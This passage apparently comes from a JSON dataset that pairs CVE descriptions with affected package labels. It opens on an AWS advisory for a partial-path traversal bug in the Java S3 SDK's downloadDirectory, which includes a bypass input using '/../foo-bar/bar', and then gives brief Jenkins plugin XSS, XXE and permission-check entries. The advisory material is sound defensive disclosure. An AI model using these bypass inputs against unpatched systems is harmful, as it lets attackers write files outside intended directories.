Applications using the SDK control the `destinationDirectory` argument, but S3 object keys are determined by the application that uploaded the objects. The `downloadDirectory` method allows the caller to pass a filesystem object in the object key but contained an issue in the validation logic for the key name. A knowledgeable actor could bypass the validation logic by including a UNIX double-dot in the bucket key. Under certain conditions, this could permit them to retrieve a directory from their S3 bucket that is one level up in the filesystem from their working directory. \n\nThis issue\u2019s scope is limited to directories whose name prefix matches the destinationDirectory. E.g. for destination directory`/tmp/foo`, the actor can cause a download to `/tmp/foo-bar`, but not `/tmp/bar`. \n\nVersions of the AWS Java SDK for S3 v1 before and including v1.12.260 are affected by this issue. \n\n### Impact\n\nIf `com.amazonaws.services.s3.transfer.TransferManager::downloadDirectory` is used to download an untrusted buckets contents, the contents of that bucket can be written outside of the intended destination directory.\n\n#### Root Cause\n\nThe `com.amazonaws.services.s3.transfer.TransferManager::downloadDirectory` contains a partial-path traversal vulnerability.\n\nThis is due to the guard logic in `leavesRoot` containing an insufficient protection against partial-path traversal.\n\nhttps://github.com/aws/aws-sdk-java/blob/5be0807af763b9fbf6b0a153c76dd305e407f035/aws-java-sdk-s3/src/main/java/com/amazonaws/services/s3/transfer/TransferManager.java#L1513-L1519\n\nThe application controls the `localBaseDirectory` argument, but the `key` comes from the AWS bucket entry (ie. can be attacker controlled). The above bit of logic can be bypassed with the following payloads:\n\n```java\n// The following will return 'false', although the attacker value will \"leave\" the `/usr/foo` directory\nleavesRoot(new File(\"/usr/foo\"), \"/../foo-bar/bar\")\n```\n\nThis guard is used here which should guard against path traversal, however `leavesRoot` is an insufficient guard:\n\nhttps://github.com/aws/aws-sdk-java/blob/ae88c8aa4b195047b94c154897475f85642d7eb3/aws-java-sdk-s3/src/main/java/com/amazonaws/services/s3/transfer/TransferManager.java#L1420-L1423\n\n#### True Root cause\n\n If the result of `parent.getCanonicalPath()` is not slash terminated it allows for partial path traversal.\n\n> Consider `\"/usr/outnot\".startsWith(\"/usr/out\")`. The check is bypassed although `outnot` is not under the `out` directory.\nThe terminating slash may be removed in various places. On Linux `println(new File(\"/var/\"))` returns `/var`, but `println(new File(\"/var\", \"/\"))` - `/var/`, however `println(new File(\"/var\", \"/\").getCanonicalPath())` - `/var`.\n \\- [@JarLob (Jaroslav Loba\u010devski)](https://github.com/JarLob)\n\n### Patches\n\nUpgrade to the AWS SDK for Java >= 1.12.261, if you are on a version < 1.12.261.\n\n### Workarounds\n\nWhen calling `com.amazonaws.services.s3.transfer.TransferManager::downloadDirectory` pass a `KeyFilter` that forbids `S3ObjectSummary` objects that `getKey` method return a string containing the substring `..` .\n\n### References\n\nSimilar vulnerabilities:\n - ESAPI (The OWASP Enterprise Security API) - https://nvd.nist.gov/vuln/detail/CVE-2022-23457\n\n### For more information\n\nIf you have any questions or comments about this advisory, please contact [AWS's Security team](mailto:aws-security@amazon.com).\n", "labels": ["com.amazonaws:aws-java-sdk-s3"]}, {"cve_id": "CVE-2022-34783", "desc": "Jenkins Plot Plugin 2.1.10 and earlier does not escape plot descriptions, resulting in a stored cross-site scripting (XSS) vulnerability exploitable by attackers with Item/Configure permission.", "labels": ["org.jenkins-ci.plugins:plot"]}, {"cve_id": "CVE-2022-34793", "desc": "Jenkins Recipe Plugin 1.2 and earlier does not configure its XML parser to prevent XML external entity (XXE) attacks.", "labels": ["org.jenkins-ci.plugins:recipe"]}, {"cve_id": "CVE-2022-36896", "desc": "BMC Compuware Source Code Download for Endevor, PDS, and ISPW Plugin 2.0.12 and earlier does not perform permission checks in several HTTP endpoints.\n\nThis allows attackers with Overall/Read permission to enumerate hosts and ports of Compuware configurations and credentials IDs of credentials stored in Jenkins.
